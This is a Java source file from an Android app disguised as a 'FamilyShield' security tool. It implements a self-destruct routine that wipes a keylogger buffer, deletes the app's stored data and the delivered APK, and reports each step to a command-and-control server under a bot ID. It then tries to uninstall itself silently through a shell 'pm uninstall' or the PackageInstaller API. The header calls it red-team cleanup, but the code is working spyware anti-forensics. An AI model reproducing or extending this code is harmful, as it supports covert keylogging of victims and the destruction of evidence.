package com.familyshield.device.guard;

import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.PackageInstaller;
import android.os.*;
import android.provider.Settings;
import android.util.Log;
import java.io.*;

/**
 * Full red-team cleanup: wipes all local data then attempts silent uninstall.
 *
 * Teardown order:
 *   1. Clear keylog buffer
 *   2. Delete app private files (caches, databases, shared prefs)
 *   3. Delete the downloaded APK from external storage if still present
 *   4. Remove Device Admin / Device Owner status so uninstall is not blocked
 *   5a. Device Owner silent uninstall (no user prompt — highest success rate)
 *   5b. Shell  pm uninstall  (works if ADB/root active)
 *   5c. PackageInstaller API (system dialog — user sees "Do you want to uninstall?")
 *
 * Reports status back to C2 before each step so the operator knows how far
 * cleanup got even if the process is killed partway through.
 */
public class SelfDestruct {

    private static final String TAG = "SelfDestruct";

    public static String run(Context ctx, C2Client c2, String botId) {
        StringBuilder log = new StringBuilder("=== SELF-DESTRUCT INITIATED ===\n");
        final String pkg = ctx.getPackageName();

        // ── 1. Wipe keylog buffer ─────────────────────────────────────────────
        try {
            com.familyshield.device.guard.AccessibilityHelperService.flushLogs();   // clear in-memory buffer
            log.append("[1] Keylog buffer cleared\n");
        } catch (Exception e) {
            log.append("[1] Keylog wipe error: ").append(e.getMessage()).append("\n");
        }

        // ── 2. Wipe app private storage ───────────────────────────────────────
        try {
            deleteRecursive(ctx.getFilesDir());
            deleteRecursive(ctx.getCacheDir());
            deleteRecursive(new File(ctx.getApplicationInfo().dataDir, "shared_prefs"));
            deleteRecursive(new File(ctx.getApplicationInfo().dataDir, "databases"));
            log.append("[2] App private storage wiped\n");
        } catch (Exception e) {
            log.append("[2] Storage wipe error: ").append(e.getMessage()).append("\n");
        }

        // ── 3. Delete APK from Downloads / external if still there ────────────
        try {
            int deleted = deleteApkFromExternal(ctx, pkg);
            log.append("[3] External APK files deleted: ").append(deleted).append("\n");
        } catch (Exception e) {
            log.append("[3] External APK delete error: ").append(e.getMessage()).append("\n");
        }

        log.append("[4] Device Admin — not registered (skipped)\n");

        // Send partial report before uninstall kills the process
        c2.sendResult(botId, log.toString() + "[5] Attempting uninstall...\n");

        // ── 5a. Device Owner silent uninstall ─────────────────────────────────
        if (tryDeviceOwnerUninstall(ctx, pkg)) {
            return log.append("[5a] Device Owner silent uninstall triggered — app will be removed\n").toString();
        }

        // ── 5b. Shell pm uninstall ────────────────────────────────────────────
        if (tryShellUninstall(pkg)) {
            return log.append("[5b] Shell pm uninstall succeeded\n").toString();
        }

        // ── 5c. PackageInstaller API (user sees system dialog) ────────────────
        if (tryPackageInstallerUninstall(ctx, pkg)) {
            return log.append("[5c] PackageInstaller uninstall dialog shown to user\n").toString();
        }

        log.append("[5] All uninstall methods failed — data wiped but APK remains\n");
        log.append("    Manual removal: adb uninstall ").append(pkg).append("\n");
        return log.toString();
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private static void deleteRecursive(File f) {
        if (f == null || !f.exists()) return;
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) for (File c : children) deleteRecursive(c);
        }
        f.delete();
    }

    private static int deleteApkFromExternal(Context ctx, String pkg) {
        int count = 0;
        // Check standard download directories for the APK we delivered
        File[] searchDirs = new File[]{
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            ctx.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS),
            ctx.getExternalCacheDir(),
        };
        for (File dir : searchDirs) {
            if (dir == null || !dir.exists()) continue;
            File[] files = dir.listFiles();
            if (files == null) continue;
            for (File f : files) {
                // Match our APK by name patterns
                String name = f.getName().toLowerCase();
                if (name.endsWith(".apk") && (name.contains("security") || name.contains("audit") || name.contains("it-") || name.contains("mdm"))) {
                    if (f.delete()) count++;
                }
            }
        }
        return count;
    }

    private static boolean tryDeviceOwnerUninstall(Context ctx, String pkg) {
        return false;
    }

    private static boolean tryShellUninstall(String pkg) {
        try {
            // Works if ADB is active or device is rooted
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"pm", "uninstall", "-k", "--user", "0", pkg});
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            Log.w(TAG, "shell uninstall: " + e.getMessage());
            return false;
        }
    }

    private static boolean tryPackageInstallerUninstall(Context ctx, String pkg) {
        try {
            PackageInstaller pi = ctx.getPackageManager().getPackageInstaller();
            // Create a broadcast intent to receive the result
            Intent intent = new Intent(pkg + ".UNINSTALL_RESULT");
            PendingIntent pi2 = PendingIntent.getBroadcast(ctx, 0, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            pi.uninstall(pkg, pi2.getIntentSender());
            return true;
        } catch (Exception e) {
            Log.w(TAG, "PackageInstaller uninstall: " + e.getMessage());
            return false;
        }
    }
}
